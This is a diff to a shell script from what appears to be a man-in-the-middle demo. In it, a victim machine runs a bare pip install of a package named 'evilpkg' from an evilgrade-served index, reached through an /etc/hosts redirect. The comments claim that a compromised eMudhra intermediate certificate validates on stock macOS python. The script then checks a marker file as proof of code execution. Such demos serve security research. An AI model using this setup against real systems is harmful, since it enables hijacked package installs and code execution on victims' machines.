@@ -14,9 +14,11 @@
 # Usage:
 #   demo/emudhra_mitm/victim_pip.sh [sslport] [--no-hosts]
 #
-# Uses the SYSTEM python3 (/usr/bin/python3) with --cert /etc/ssl/cert.pem to
-# model a pip that trusts the system store. pip's default certifi is NOT
-# vulnerable.
+# Uses the stock macOS python3 (/usr/bin/python3) with a BARE pip install -- no
+# --cert, no injected CA. The server cert is a real eMudhra intermediate
+# (compromised key) cross-signed by the public AAA/Sectigo root, so it validates
+# by default on any client whose trust store still ships that root (stock macOS
+# python here). A patched bundle (Homebrew python, Apple SecureTransport) rejects.
 ###############################################################################
 set -u
 PORT=443; NOHOSTS=0
@@ -35,9 +37,9 @@ if [ "$NOHOSTS" = 0 ] && ! grep -qF "$HOSTS_LINE" /etc/hosts 2>/dev/null; then
 fi
 
 rm -f /tmp/OWNED_BY_PIP
-echo "== VICTIM: pip install evilpkg (-> evilgrade on :$PORT) =="
-echo "   \$ /usr/bin/python3 -m pip install --cert /etc/ssl/cert.pem --index-url $IDX evilpkg"
-timeout 90 /usr/bin/python3 -m pip install --cert /etc/ssl/cert.pem \
+echo "== VICTIM: BARE pip install evilpkg (-> evilgrade on :$PORT, stock python, no flags) =="
+echo "   \$ /usr/bin/python3 -m pip install --index-url $IDX evilpkg"
+timeout 90 /usr/bin/python3 -m pip install \
     --no-build-isolation --no-cache-dir --disable-pip-version-check \
     --index-url "$IDX" evilpkg 2>&1 | tail -6 | sed 's/^/   /'
 /usr/bin/python3 -m pip uninstall -y evilpkg >/dev/null 2>&1
